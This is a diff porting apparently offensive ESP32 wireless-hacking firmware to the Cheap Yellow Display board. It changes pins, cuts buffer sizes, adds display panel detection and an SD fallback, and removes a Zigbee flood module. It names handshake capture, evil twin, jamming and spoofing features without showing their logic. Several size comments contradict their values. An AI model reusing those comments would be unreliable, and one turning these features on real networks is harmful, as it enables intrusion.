@@ -84,6 +84,8 @@ LV_IMG_DECLARE(deedee_img);
 #include "esp_lcd_panel_io.h"
 #include "esp_lcd_panel_vendor.h"
 #include "esp_lcd_panel_ops.h"
+#include "esp_lcd_panel_st7789.h"   // CYD2USB port: built-in ST7789 panel driver (two-USB CYD)
+#include "esp_lcd_ili9341.h"       // local component, used when ID register says ILI9341
 #include "xpt2046.h"
 #include "driver/spi_master.h"
 #include "driver/gpio.h"
@@ -101,7 +103,9 @@ LV_IMG_DECLARE(deedee_img);
 #include "esp_event.h"
 #include "freertos/semphr.h"
 #include "esp_system.h"
+#if CONFIG_IDF_TARGET_ESP32C5
 #include "soc/lp_aon_reg.h"
+#endif
 #include "wifi_cli.h"
 #include "led_strip.h"
 #include "wifi_scanner.h"
@@ -172,7 +176,6 @@ LV_IMG_DECLARE(deedee_img);
 #include "cc1101.h"
 #include "cc1101_regs.h"
 #include "nrf24.h"
-#include "esp_ieee802154.h"
 #include "rfid_manager.h"
 #include "rfid_types.h"
 #include "rfid_storage.h"
@@ -180,6 +183,16 @@ LV_IMG_DECLARE(deedee_img);
 #include "flipper_lf_file.h"
 #include "services/gap/ble_svc_gap.h"
 #include "services/gatt/ble_svc_gatt.h"
+
+
+// ── ESP32-classic port: no PSRAM → EXT_RAM_BSS_ATTR is a no-op ──────────────
+// On the C5 build this maps to __attribute__((section(".ext_ram.bss"))) via
+// SPIRAM_ALLOW_BSS_SEG_EXTERNAL_MEMORY. The classic ESP32 has no PSRAM, so we
+// neutralize it; all attributed arrays simply live in internal DRAM (sizes were
+// tightened accordingly — see docs/memory-budget.md).
+#ifndef EXT_RAM_BSS_ATTR
+#define EXT_RAM_BSS_ATTR
+#endif
 
 #define TAG "WiFi_Hacker"
 
@@ -213,7 +226,8 @@ static volatile bool nimble_initialized  = false;
 static bool          s_ble_for_blueduck  = false; /* selects GATT table at bt_nimble_init time */
 
 // BLE device tracking for deduplication
-#define BT_MAX_DEVICES 128
+// CYD port: 48 entries (was 128) — struct is 56B; 2.7KB saved for DRAM budget.
+#define BT_MAX_DEVICES 12
 static uint8_t bt_found_devices[BT_MAX_DEVICES][6];
 static int bt_found_device_count = 0;
 
@@ -330,7 +344,7 @@ static volatile bool ble_spoof_needs_ui_update = false;
 //
 // Stage 1: passive detect + channel hop (1-13, 200 ms dwell)
 // Stage 2: label known devices from /sdcard/lab/espnow/profiles.json
-#define ESPNOW_MAX_DEVICES   32
+#define ESPNOW_MAX_DEVICES   8
 #define ESPNOW_MAX_PROFILES  16
 #define ESPNOW_DWELL_MS      200
 #define ESPNOW_EXPORT_DIR    "/sdcard/lab/espnow"
@@ -398,7 +412,8 @@ static lv_obj_t      *espnow_pl_status    = NULL;
 static lv_timer_t    *espnow_pl_timer     = NULL;
 
 // BLE Spoof general list (spooflist.txt)
-#define SPOOF_LIST_MAX  64
+// CYD port: name/path buffers halved vs PSRAM-era capacities (DRAM budget).
+#define SPOOF_LIST_MAX  16
 #define SPOOF_LIST_PATH "/sdcard/lab/bluetooth/spooflist.csv"
 typedef struct { uint8_t mac[6]; char name[33]; } spoof_list_entry_t;
 EXT_RAM_BSS_ATTR static spoof_list_entry_t s_spoof_list[SPOOF_LIST_MAX];
@@ -434,21 +449,28 @@ static void (*s_ble_disc_return_fn)(void) = NULL;
 
 // ============================================================================
 
-// Pin configuration — NM-CYD-C5 (RockBase-iot/NM-CYD-C5, User_Setup-NM-CYD-C5.h)
-#define LCD_MOSI 7
-#define LCD_MISO 2
-#define LCD_CLK  6
-#define LCD_CS   23
-#define LCD_DC   24
+// Pin configuration — ESP32-2432S028R (Cheap Yellow Display, CYD)
+// Display: ST7789 (CYD2USB two-USB variant) on its own SPI bus (VSPI / SPI3_HOST)
+#define LCD_HOST   SPI3_HOST
+#define LCD_MOSI 13
+#define LCD_MISO 12
+#define LCD_CLK  14
+#define LCD_CS   15
+#define LCD_DC   2
 #define LCD_RST  -1   // Tied to board RST/EN — not a GPIO
 
-// XPT2046 resistive touch — SPI shared bus (T_IRQ not connected, polling only)
-#define TOUCH_CS  1
+// XPT2046 resistive touch — dedicated SPI bus (HSPI / SPI2_HOST) on CYD
+#define TOUCH_HOST SPI2_HOST
+#define TOUCH_CLK  25
+#define TOUCH_MOSI 32
+#define TOUCH_MISO 39
+#define TOUCH_CS   33
+#define TOUCH_IRQ  36   // active low, optional (polling used)
 
-// Backlight GPIO (HIGH = on; GPIO 25 is strapping pin but safe after boot)
-#define LCD_BL_IO 25
+// Backlight GPIO (HIGH = on; GPIO 21 on CYD)
+#define LCD_BL_IO 21
 #define LCD_BL_ACTIVE_LEVEL 1
-#define BOOT_BTN_GPIO        28   // NM-CYD-C5 BOOT button = IO28 (strapping pin, input-safe)
+#define BOOT_BTN_GPIO        0    // CYD BOOT button = IO0 (strapping pin, input-safe)
 #define GO_DARK_DBL_CLICK_MS 800
 
 // NOTE: No battery ADC on NM-CYD-C5 — GPIO6 is SPI SCK, not battery monitor.
@@ -460,12 +482,11 @@ static void (*s_ble_disc_return_fn)(void) = NULL;
 
 #define LCD_H_RES 240
 #define LCD_V_RES 320
-#define LCD_HOST SPI2_HOST
 
 // Vibrator motor — GPIO26 → SC8002B amp (SPEAK_IN). LEDC PWM drives the amp
 // input; a Schottky diode + flyback diode on the speaker header rectify the BTL
 // output to give pulsed DC to the motor.
-#define VIBRATOR_GPIO        26
+#define VIBRATOR_GPIO        4    // CYD: free GPIO (P3 header); wire external vibrator module here
 #define VIBRATOR_LEDC_TIMER  LEDC_TIMER_2
 #define VIBRATOR_LEDC_CH     LEDC_CHANNEL_4
 #define VIBRATOR_FREQ_HZ     333              // 333 Hz — confirmed best haptic feel
@@ -701,7 +722,7 @@ typedef enum { WD_RADIO_WIFI_ONLY = 0, WD_RADIO_BLE_ONLY } wd_radio_mode_t;
 
 // Drone Detector — Remote ID (ASTM F3411-22a)
 #define DRONE_DETECT_DIR     "/sdcard/lab/dronedetect"
-#define DRONE_MAX            20
+#define DRONE_MAX            6
 #define DRONE_WIFI_PHASE_MS  10000   // ms per WiFi promiscuous pass
 #define DRONE_WIFI_DWELL_MS     60   // ms dwell per channel — short revisit so every
                                      // 5 GHz RID channel is sampled ~13x/phase (was 500)
@@ -854,7 +875,7 @@ static volatile bool g_wcs_scan_active  = false;  /* WCS client scan owns SCAN_D
 
 // Whitelist for BSSID and SSID protection
 #define MAX_WHITELISTED_BSSIDS 150
-#define MAX_WHITELISTED_SSIDS 50
+#define MAX_WHITELISTED_SSIDS 16
 typedef struct {
     uint8_t bssid[6];
 } whitelisted_bssid_t;
@@ -871,6 +892,13 @@ static int whitelistedSsidCount = 0;
 #define SD_CACHE_MAX_FILENAME_LEN 64
 #define SD_CACHE_MAX_HTML_FILES 32
 #define SD_CACHE_MAX_HANDSHAKES 100
+// CYD port: classic ESP32 has no PSRAM — use internal heap for the SD browser
+// cache so it works; on PSRAM targets (C5) SPIRAM is preferred.
+#ifdef CONFIG_ESP32_SPIRAM_SUPPORT
+#define SD_CACHE_HEAP_CAP MALLOC_CAP_SPIRAM
+#else
+#define SD_CACHE_HEAP_CAP MALLOC_CAP_8BIT
+#endif
 
 typedef struct {
     // Evil Twin passwords (eviltwin.txt)
@@ -1092,9 +1120,10 @@ static volatile bool handshake_attack_active = false;
 static volatile bool handshake_waiting_for_scan = false;
 static volatile bool g_handshaker_global_mode = false;
 static bool handshake_selected_mode = false;
-EXT_RAM_BSS_ATTR static wifi_ap_record_t handshake_targets[MAX_AP_CNT];
+// CYD port: 64 targets (was 128 x 92B) — 5.9KB saved.
+EXT_RAM_BSS_ATTR static wifi_ap_record_t handshake_targets[MAX_AP_CNT / 4];
 static int handshake_target_count = 0;
-static bool handshake_captured[MAX_AP_CNT];
+static bool handshake_captured[MAX_AP_CNT / 4];
 static int handshake_current_index = 0;
 
 // ============================================================================
@@ -1171,10 +1200,12 @@ static volatile int hs_total_handshakes_captured = 0;
 // Wardrive Promisc: Kismet-style tiered channel lists + D-UCB
 // ============================================================================
 
+// CYD port: 5GHz channel lists emptied — classic ESP32 has no 5GHz radio.
+// Keeping the arrays (empty) preserves the WDP_TOTAL_CHANNELS arithmetic.
 static const uint8_t wdp_ch_24_primary[]   = {1, 6, 11};
 static const uint8_t wdp_ch_24_secondary[] = {2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
-static const uint8_t wdp_ch_5_non_dfs[]    = {36, 40, 44, 48, 149, 153, 157, 161, 165};
-static const uint8_t wdp_ch_5_dfs[]        = {52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 169, 173, 177};
+static const uint8_t wdp_ch_5_non_dfs[]    = {0};
+static const uint8_t wdp_ch_5_dfs[]        = {0};
 
 #define WDP_CH_24_PRIMARY_COUNT   (sizeof(wdp_ch_24_primary) / sizeof(wdp_ch_24_primary[0]))
 #define WDP_CH_24_SECONDARY_COUNT (sizeof(wdp_ch_24_secondary) / sizeof(wdp_ch_24_secondary[0]))
@@ -1369,8 +1400,9 @@ typedef struct {
     float    accuracy;  // GPS accuracy at time of discovery (m); GPS_STALE_ACCURACY_M if held
 } wdp_network_t;
 
-#define WDP_DEDUP_BUFFER_SIZE  100
-#define WDP_SCREEN_FIFO_SIZE   20
+// CYD port: 48-entry dedup (was 100) — struct ~68B; 3.5KB saved.
+#define WDP_DEDUP_BUFFER_SIZE  14
+#define WDP_SCREEN_FIFO_SIZE   10
 #define WDP_GPS_MOVE_THRESHOLD_M 45.72  // 150 feet in meters
 
 EXT_RAM_BSS_ATTR static wdp_ducb_channel_t wdp_ducb_channels[WDP_TOTAL_CHANNELS];
@@ -1601,8 +1633,10 @@ static volatile int     wdup_wdg_ok_cnt      = 0;
 static volatile int     wdup_wdg_dup_cnt     = 0;
 static volatile int     wdup_wdg_fail_cnt    = 0;
 // wd_manage_paths declared here so wdup_task (explicit mode) can reference it
-#define WD_MANAGE_MAX_FILES 64
-EXT_RAM_BSS_ATTR static char wd_manage_paths[WD_MANAGE_MAX_FILES][320];
+// CYD port (4MB flash / no PSRAM): path buffers shrunk from PSRAM-era sizes.
+// 8 entries x 128B covers a realistic wardrive log listing on a 240x320 UI.
+#define WD_MANAGE_MAX_FILES 8
+EXT_RAM_BSS_ATTR static char wd_manage_paths[WD_MANAGE_MAX_FILES][128];
 
 // SD Card settings screen state
 // Queue item for provision textarea updates: provision task queues these,
@@ -1724,7 +1758,7 @@ static volatile bool ble_scan_finished = false;
 static char ble_scan_status_text[48] = "";
 
 // Deauth Monitor state
-#define DEAUTH_MONITOR_MAX_ATTACKS 50
+#define DEAUTH_MONITOR_MAX_ATTACKS 12
 typedef struct {
     char ssid[33];
     uint8_t bssid[6];
@@ -1807,7 +1841,7 @@ static lv_obj_t     *s_detail_page_lbl    = NULL;
 #define WANA_SEP_X     200   // separator stripe x-start
 #define WANA_5G_X      208   // 5 GHz band x-start
 #define WANA_5G_W      312   // 5 GHz band width  (208+312=520)
-#define WANA_MAX_APS     48
+#define WANA_MAX_APS     12
 #define WANA_MAX_LABELS  48
 #define WANA_MAX_SSIDS   20   // max unique SSID groups shown in picker
 #define WANA_MAX_SCROLL  (WANA_WIDE_W - 240)   // 280
@@ -2038,99 +2072,6 @@ typedef struct {
 } cc1101_tpms_ctx_t;
 EXT_RAM_BSS_ATTR static cc1101_tpms_ctx_t *s_tpms = NULL;
 
-// ── Zigbee Scout (passive/active 802.15.4 scanner, built-in ESP32-C5 radio) ──
-#define ZGWD_DWELL_MS        250   // ms to receive on each channel
-#define ZGWD_MAX_PANS         64   // unique PAN IDs tracked
-#define ZGWD_Q_DEPTH          24   // ISR→task frame queue depth
-#define ZGWD_MAX_DEVS_PER_PAN 16   // short addresses tracked per PAN
-#define ZGWD_SAVE_DIR  "/sdcard/lab/zigbee"
-
-// Frame type bitmask flags
-#define ZGWD_FT_BEACON  0x01
-#define ZGWD_FT_DATA    0x02
-#define ZGWD_FT_ACK     0x04
-#define ZGWD_FT_CMD     0x08
-
-typedef struct {
-    uint16_t pan_id;
-    uint8_t  channel;
-    int8_t   rssi_min;
-    int8_t   rssi_max;
-    uint8_t  frame_types;                      // bitmask: ZGWD_FT_*
-    uint16_t frame_count;
-    uint64_t ext_pan_id;                       // from beacon payload (0=unknown)
-    uint8_t  stack_profile;                    // 0=unknown,1=Zigbee,2=ZigbeePRO
-    bool     router_cap;
-    bool     end_dev_cap;
-    uint8_t  device_count;
-    uint16_t devices[ZGWD_MAX_DEVS_PER_PAN];   // unique short addrs seen
-} zgwd_pan_entry_t;
-
-typedef struct {
-    uint8_t  data[128];
-    uint8_t  len;
-    int8_t   rssi;
-    uint8_t  lqi;
-    uint8_t  channel;
-} zgwd_frame_msg_t;
-
-typedef struct {
-    lv_obj_t    *status_lbl;
-    lv_obj_t    *pan_list;
-    lv_obj_t    *passive_btn;
-    lv_obj_t    *active_btn;
-    lv_timer_t  *tmr;
-    bool         scanning;
-    bool         active_mode;
-    volatile bool cancel;
-    TaskHandle_t task;
-    int          frame_count;
-    int          pan_count;
-    uint8_t      current_channel;
-    zgwd_pan_entry_t pans[ZGWD_MAX_PANS];
-    char         csv_path[80];
-    char         pcap_path[80];
-} zgwd_ctx_t;
-
-// RSSI locator sub-context (allocated when locator screen opens)
-typedef struct {
-    lv_obj_t    *rssi_bar;
-    lv_obj_t    *rssi_lbl;
-    lv_obj_t    *pan_lbl;
-    lv_timer_t  *tmr;
-    TaskHandle_t task;
-    int          pan_idx;
-    volatile int8_t last_rssi;
-    volatile bool   got_rssi;
-    uint8_t      channel;
-    volatile bool running;
-} zgwd_loc_ctx_t;
-
-// Association flood sub-context
-typedef struct {
-    lv_obj_t    *count_lbl;
-    lv_obj_t    *stop_btn;
-    lv_timer_t  *tmr;
-    TaskHandle_t task;
-    volatile bool cancel;
-    uint16_t     pan_id;
-    uint8_t      channel;
-    int          sent;
-} zgwd_flood_ctx_t;
-
-EXT_RAM_BSS_ATTR static zgwd_ctx_t       *s_zgwd      = NULL;
-EXT_RAM_BSS_ATTR static zgwd_loc_ctx_t   *s_zgwd_loc  = NULL;
-EXT_RAM_BSS_ATTR static zgwd_flood_ctx_t *s_zgwd_fld  = NULL;
-// PAN data saved when navigating to detail/locator/flood, restored on return to scout
-EXT_RAM_BSS_ATTR static zgwd_pan_entry_t  s_zgwd_saved_pans[ZGWD_MAX_PANS];
-static int s_zgwd_saved_pan_count   = 0;
-static int s_zgwd_saved_frame_count = 0;
-static QueueHandle_t  s_zgwd_rx_q  = NULL;
-static SemaphoreHandle_t s_zgwd_tx_sem = NULL;
-static uint8_t s_zgwd_seq = 0;
-static lv_obj_t *s_zgwd_da_lbl = NULL;
-static volatile int s_zgwd_da_result = 0;
-
 // AirTag Scanner state
 static TaskHandle_t airtag_scan_task_handle = NULL;
 static StaticTask_t airtag_scan_task_buffer;
@@ -2254,7 +2195,7 @@ static int       lw_acc_nsel      = 0;      // number of files in last accumulat
 static bool      lw_acc_is_union  = false;  // true=Unique, false=Common
 
 // ── BT Observer ─────────────────────────────────────────────────
-#define BTO_MAX_DEVICES 40
+#define BTO_MAX_DEVICES 6
 
 typedef enum {
     BTO_DEV_QUEUED = 0,
@@ -2310,7 +2251,7 @@ static lv_timer_t *bt_lookout_popup_tmr        = NULL;
 static TaskHandle_t bt_lookout_scan_loop_handle = NULL;
 
 // ── BT Blacklist ─────────────────────────────────────────────────
-#define BT_BLACKLIST_MAX 128
+#define BT_BLACKLIST_MAX 48
 #define BT_BLACKLIST_CSV_PATH "/sdcard/lab/bluetooth/blacklist.csv"
 typedef struct {
     uint8_t mac[6];
@@ -2496,10 +2437,6 @@ static void show_nrf24_sniffer_screen(void);
 static void show_nrf24_saved_screen(void);
 static void show_nrf24_jammer_screen(void);
 static void show_nrf24_futaba_screen(void);
-static void show_zigbee_wardrive_screen(void);
-static void show_zgwd_pan_detail(int pan_idx);
-static void show_zgwd_locator(int pan_idx);
-static void show_zgwd_flood(int pan_idx);
 static void show_ir_capture_screen(void);
 static void show_ir_replay_screen(void);
 static void show_ir_signal_list_screen(void);
@@ -2715,26 +2652,6 @@ static void reset_function_page_children(void) {
     s_n24_jam_active = false;
     s_n24_jam_status = NULL;
     if (s_n24_jam_tmr) { lv_timer_del(s_n24_jam_tmr); s_n24_jam_tmr = NULL; }
-    // Zigbee Scout cleanup — main thread owns the free (task only sets task=NULL)
-    if (s_zgwd) {
-        s_zgwd->cancel = true; s_zgwd->scanning = false;
-        s_zgwd->status_lbl = NULL; s_zgwd->pan_list = NULL;
-        s_zgwd->passive_btn = NULL; s_zgwd->active_btn = NULL;
-        if (s_zgwd->tmr) { lv_timer_del(s_zgwd->tmr); s_zgwd->tmr = NULL; }
-        if (!s_zgwd->task) { heap_caps_free(s_zgwd); s_zgwd = NULL; }
-    }
-    if (s_zgwd_loc) {
-        s_zgwd_loc->running = false;
-        if (s_zgwd_loc->tmr) { lv_timer_del(s_zgwd_loc->tmr); s_zgwd_loc->tmr = NULL; }
-        s_zgwd_loc->rssi_bar = NULL; s_zgwd_loc->rssi_lbl = NULL; s_zgwd_loc->pan_lbl = NULL;
-        if (!s_zgwd_loc->task) { heap_caps_free(s_zgwd_loc); s_zgwd_loc = NULL; }
-    }
-    s_zgwd_da_lbl = NULL; s_zgwd_da_result = 0;
-    if (s_zgwd_fld) {
-        s_zgwd_fld->cancel = true;
-        if (s_zgwd_fld->tmr) { lv_timer_del(s_zgwd_fld->tmr); s_zgwd_fld->tmr = NULL; }
-        if (!s_zgwd_fld->task) { heap_caps_free(s_zgwd_fld); s_zgwd_fld = NULL; }
-    }
     deauth_monitor_rec_label = NULL;
     bt_locator_content = NULL;
     bt_locator_list = NULL;
@@ -3648,7 +3565,7 @@ static void init_display(void)
     esp_lcd_panel_io_spi_config_t io_config = {
         .dc_gpio_num = LCD_DC,
         .cs_gpio_num = LCD_CS,
-        .pclk_hz = 80 * 1000 * 1000,   // 80MHz LCD SPI (was 40) — halves the per-flush SPI push time. REQUIRES the draw buffers in INTERNAL SRAM (see app_main): at 80MHz a PSRAM-sourced DMA underruns the SPI FIFO and the display tears. 40MHz is the max with PSRAM buffers.
+        .pclk_hz = 40 * 1000 * 1000,   // CYD: 40MHz is the reliable ceiling — 80MHz produced garbage/noise on this board.
         .lcd_cmd_bits = 8,
         .lcd_param_bits = 8,
         .spi_mode = 0,
@@ -3659,14 +3576,63 @@ static void init_display(void)
 
     const esp_lcd_panel_dev_config_t panel_config = {
         .reset_gpio_num = LCD_RST,
-        .rgb_ele_order = LCD_RGB_ELEMENT_ORDER_RGB,
+        .rgb_ele_order = LCD_RGB_ELEMENT_ORDER_RGB,  // LVGL_CYD: both ILI9341 & ST7789 CYD variants use RGB order
         .bits_per_pixel = 16,
     };
 
-    ESP_ERROR_CHECK(esp_lcd_new_panel_st7789(lcd_io_handle, &panel_config, &panel_handle));
+    // Auto-detect the panel controller by reading its ID register (same trick
+    // as LVGL_CYD): ILI9341 answers 0xD3 with 0x93/0x41, anything else is the
+    // ST7789 used on CYD2USB boards. The two need different drivers, and the
+    // ST7789 additionally needs a color-inversion + gamma-curve fix.
+    uint8_t id4[4] = { 0, 0, 0, 0 };
+    esp_err_t id_rc = esp_lcd_panel_io_rx_param(lcd_io_handle, 0xD3, id4, 4);
+    bool is_ili9341 = (id_rc == ESP_OK && id4[2] == 0x93 && id4[3] == 0x41);
+    ESP_LOGI(TAG, "Panel ID read rc=%d bytes=%02x %02x %02x %02x -> %s",
+             id_rc, id4[0], id4[1], id4[2], id4[3],
+             is_ili9341 ? "ILI9341" : "ST7789 (CYD2USB)");
+
+    if (is_ili9341) {
+        ESP_ERROR_CHECK(esp_lcd_new_panel_ili9341(lcd_io_handle, &panel_config, &panel_handle));
+    } else {
+        ESP_ERROR_CHECK(esp_lcd_new_panel_st7789(lcd_io_handle, &panel_config, &panel_handle));
+    }
     ESP_ERROR_CHECK(esp_lcd_panel_reset(panel_handle));
     ESP_ERROR_CHECK(esp_lcd_panel_init(panel_handle));
-    ESP_ERROR_CHECK(esp_lcd_panel_invert_color(panel_handle, false));
+    if (!is_ili9341) {
+        // ST7789 (CYD2USB) needs color inversion + a gamma-curve fix (LVGL_CYD / TFT_eSPI #2985).
+        ESP_ERROR_CHECK(esp_lcd_panel_invert_color(panel_handle, true));
+        {
+            uint8_t gc = 2;
+            esp_lcd_panel_io_tx_param(lcd_io_handle, 0x26, &gc, 1);  // GAMMA SET curve 2
+            vTaskDelay(pdMS_TO_TICKS(120));
+            gc = 1;
+            esp_lcd_panel_io_tx_param(lcd_io_handle, 0x26, &gc, 1);  // GAMMA SET curve 1
+        }
+    }
+    // Standard CYD pinout/orientation: portrait 240x320, NO swap, NO mirror
+    // (my earlier mirror(true,false) mirrored the image on this panel). The
+    // panel GRAM is an SRAM inside the ST7789 that erase_flash CANNOT wipe,
+    // so we also repaint the whole panel black first to drop any stale frame
+    // left by a previous firmware.
+    ESP_ERROR_CHECK(esp_lcd_panel_swap_xy(panel_handle, false));
+    ESP_ERROR_CHECK(esp_lcd_panel_mirror(panel_handle, false, false));
+    // Wipe the on-panel GRAM with a black fill, drawn in 8-row strips (within the
+    // 7200-byte SPI transfer limit) so no old firmware's frame lingers on screen.
+    {
+        const int strip = 8;                       // 8 rows x 240 col x 2 B = 3840 B
+        const int blw   = LCD_H_RES * strip;
+        uint16_t *blk = heap_caps_malloc(sizeof(uint16_t) * blw, MALLOC_CAP_8BIT);
+        if (blk) {
+            memset(blk, 0, sizeof(uint16_t) * blw);
+            for (int yy = 0; yy < LCD_V_RES; yy += strip) {
+                int h = (yy + strip <= LCD_V_RES) ? strip : (LCD_V_RES - yy);
+                esp_lcd_panel_draw_bitmap(panel_handle, 0, yy, LCD_H_RES, yy + h, (void *)blk);
+            }
+            heap_caps_free(blk);
+            ESP_LOGI(TAG, "Display GRAM wiped (black), ST7789 invert=1 gamma-fixed, swap_xy=0 mirror=0,0 @ 40MHz");
+        }
+    }
+    ESP_ERROR_CHECK(esp_lcd_panel_disp_on_off(panel_handle, true));
 }
 
 // ============================================================================
@@ -5016,7 +4982,7 @@ static esp_err_t sd_cache_init(void) {
     }
     
     // Allocate main structure in PSRAM
-    sd_cache = (sd_cache_t *)heap_caps_calloc(1, sizeof(sd_cache_t), MALLOC_CAP_SPIRAM);
+    sd_cache = (sd_cache_t *)heap_caps_calloc(1, sizeof(sd_cache_t), SD_CACHE_HEAP_CAP);
     if (sd_cache == NULL) {
         ESP_LOGE(TAG, "Failed to allocate SD cache structure in PSRAM");
         return ESP_ERR_NO_MEM;
@@ -5024,7 +4990,7 @@ static esp_err_t sd_cache_init(void) {
     
     // Allocate eviltwin entries array
     sd_cache->eviltwin_capacity = SD_CACHE_INITIAL_CAPACITY;
-    sd_cache->eviltwin_entries = (char **)heap_caps_calloc(sd_cache->eviltwin_capacity, sizeof(char *), MALLOC_CAP_SPIRAM);
+    sd_cache->eviltwin_entries = (char **)heap_caps_calloc(sd_cache->eviltwin_capacity, sizeof(char *), SD_CACHE_HEAP_CAP);
     if (sd_cache->eviltwin_entries == NULL) {
         ESP_LOGE(TAG, "Failed to allocate eviltwin entries array");
         return ESP_ERR_NO_MEM;
@@ -5032,21 +4998,21 @@ static esp_err_t sd_cache_init(void) {
     
     // Allocate portals entries array
     sd_cache->portals_capacity = SD_CACHE_INITIAL_CAPACITY;
-    sd_cache->portals_entries = (char **)heap_caps_calloc(sd_cache->portals_capacity, sizeof(char *), MALLOC_CAP_SPIRAM);
+    sd_cache->portals_entries = (char **)heap_caps_calloc(sd_cache->portals_capacity, sizeof(char *), SD_CACHE_HEAP_CAP);
     if (sd_cache->portals_entries == NULL) {
         ESP_LOGE(TAG, "Failed to allocate portals entries array");
         return ESP_ERR_NO_MEM;
     }
     
     // Allocate HTML filenames array
-    sd_cache->html_filenames = (char **)heap_caps_calloc(SD_CACHE_MAX_HTML_FILES, sizeof(char *), MALLOC_CAP_SPIRAM);
+    sd_cache->html_filenames = (char **)heap_caps_calloc(SD_CACHE_MAX_HTML_FILES, sizeof(char *), SD_CACHE_HEAP_CAP);
     if (sd_cache->html_filenames == NULL) {
         ESP_LOGE(TAG, "Failed to allocate HTML filenames array");
         return ESP_ERR_NO_MEM;
     }
     
     // Allocate handshake names array
-    sd_cache->handshake_names = (char **)heap_caps_calloc(SD_CACHE_MAX_HANDSHAKES, sizeof(char *), MALLOC_CAP_SPIRAM);
+    sd_cache->handshake_names = (char **)heap_caps_calloc(SD_CACHE_MAX_HANDSHAKES, sizeof(char *), SD_CACHE_HEAP_CAP);
     if (sd_cache->handshake_names == NULL) {
         ESP_LOGE(TAG, "Failed to allocate handshake names array");
         return ESP_ERR_NO_MEM;
@@ -5065,7 +5031,7 @@ void sd_cache_add_eviltwin_entry(const char *entry) {
     if (sd_cache->eviltwin_count >= sd_cache->eviltwin_capacity) {
         int new_capacity = sd_cache->eviltwin_capacity * 2;
         char **new_array = (char **)heap_caps_realloc(sd_cache->eviltwin_entries, 
-                                                       new_capacity * sizeof(char *), MALLOC_CAP_SPIRAM);
+                                                       new_capacity * sizeof(char *), SD_CACHE_HEAP_CAP);
         if (new_array == NULL) {
             ESP_LOGW(TAG, "Failed to grow eviltwin cache");
             return;
@@ -5078,7 +5044,7 @@ void sd_cache_add_eviltwin_entry(const char *entry) {
     size_t len = strlen(entry);
     if (len > SD_CACHE_MAX_ENTRY_LEN - 1) len = SD_CACHE_MAX_ENTRY_LEN - 1;
     
-    char *copy = (char *)heap_caps_malloc(len + 1, MALLOC_CAP_SPIRAM);
+    char *copy = (char *)heap_caps_malloc(len + 1, SD_CACHE_HEAP_CAP);
     if (copy == NULL) {
         ESP_LOGW(TAG, "Failed to allocate eviltwin entry");
         return;
@@ -5097,7 +5063,7 @@ void sd_cache_add_portal_entry(const char *entry) {
     if (sd_cache->portals_count >= sd_cache->portals_capacity) {
         int new_capacity = sd_cache->portals_capacity * 2;
         char **new_array = (char **)heap_caps_realloc(sd_cache->portals_entries, 
-                                                       new_capacity * sizeof(char *), MALLOC_CAP_SPIRAM);
+                                                       new_capacity * sizeof(char *), SD_CACHE_HEAP_CAP);
         if (new_array == NULL) {
             ESP_LOGW(TAG, "Failed to grow portals cache");
             return;
@@ -5110,7 +5076,7 @@ void sd_cache_add_portal_entry(const char *entry) {
     size_t len = strlen(entry);
     if (len > SD_CACHE_MAX_ENTRY_LEN - 1) len = SD_CACHE_MAX_ENTRY_LEN - 1;
     
-    char *copy = (char *)heap_caps_malloc(len + 1, MALLOC_CAP_SPIRAM);
+    char *copy = (char *)heap_caps_malloc(len + 1, SD_CACHE_HEAP_CAP);
     if (copy == NULL) {
         ESP_LOGW(TAG, "Failed to allocate portal entry");
         return;
@@ -5132,7 +5098,7 @@ void sd_cache_add_handshake_name(const char *name) {
     size_t len = strlen(name);
     if (len > SD_CACHE_MAX_FILENAME_LEN - 1) len = SD_CACHE_MAX_FILENAME_LEN - 1;
     
-    char *copy = (char *)heap_caps_malloc(len + 1, MALLOC_CAP_SPIRAM);
+    char *copy = (char *)heap_caps_malloc(len + 1, SD_CACHE_HEAP_CAP);
     if (copy == NULL) {
         ESP_LOGW(TAG, "Failed to allocate handshake name");
         return;
@@ -5154,7 +5120,7 @@ static void sd_cache_add_html_filename(const char *name) {
     size_t len = strlen(name);
     if (len > SD_CACHE_MAX_FILENAME_LEN - 1) len = SD_CACHE_MAX_FILENAME_LEN - 1;
     
-    char *copy = (char *)heap_caps_malloc(len + 1, MALLOC_CAP_SPIRAM);
+    char *copy = (char *)heap_caps_malloc(len + 1, SD_CACHE_HEAP_CAP);
     if (copy == NULL) {
         ESP_LOGW(TAG, "Failed to allocate HTML filename");
         return;
@@ -5271,6 +5237,7 @@ static volatile int s_sd_err_choice = 0;
 
 static void s_sd_err_retry_cb(lv_event_t *e)   { (void)e; esp_restart(); }  // restart lets boot re-run the full SD speed-fallback sequence
 static void s_sd_err_format_cb(lv_event_t *e)  { (void)e; s_sd_err_choice = SD_ERR_FORMAT;   }
+static void s_sd_err_continue_cb(lv_event_t *e){ (void)e; s_sd_err_choice = SD_ERR_CONTINUE; }  // "Continue without SD"
 static void s_sd_fmt_yes_cb(lv_event_t *e)     { (void)e; s_sd_err_choice = SD_ERR_RETRY;    }  // "Yes, format" in confirm dialog
 static void s_sd_fmt_no_cb(lv_event_t *e)      { (void)e; s_sd_err_choice = SD_ERR_CONTINUE; }  // "Cancel" in confirm dialog
 
@@ -5344,6 +5311,20 @@ static int show_sd_error_screen(bool offer_format)
             lv_obj_center(fl);
             lv_obj_add_event_cb(fmt_btn, s_sd_err_format_cb, LV_EVENT_CLICKED, NULL);
         }
+
+        /* Continue without SD — bottom-right (always available) */
+        lv_obj_t *cont_btn = lv_btn_create(scr);
+        lv_obj_set_size(cont_btn, 100, 32);
+        lv_obj_align(cont_btn, LV_ALIGN_BOTTOM_RIGHT, -14, -12);
+        lv_obj_set_style_bg_color(cont_btn, lv_color_make(70, 90, 120), 0);
+        lv_obj_set_style_border_width(cont_btn, 0, 0);
+        lv_obj_set_style_radius(cont_btn, 8, 0);
+        lv_obj_t *cl = lv_label_create(cont_btn);
+        lv_label_set_text(cl, LV_SYMBOL_OK " Continue");
+        lv_obj_set_style_text_font(cl, &lv_font_montserrat_14, 0);
+        lv_obj_set_style_text_color(cl, lv_color_white(), 0);
+        lv_obj_center(cl);
+        lv_obj_add_event_cb(cont_btn, s_sd_err_continue_cb, LV_EVENT_CLICKED, NULL);
 
         lv_scr_load(scr);
         lv_refr_now(NULL);
@@ -5786,6 +5767,8 @@ static void gps_status_icon_create(lv_obj_t *parent, lv_coord_t x_ofs)
     gps_stat_icon_apply(g);   // reflect current state immediately
 }
 
+
+
 static void create_home_ui(void)
 {
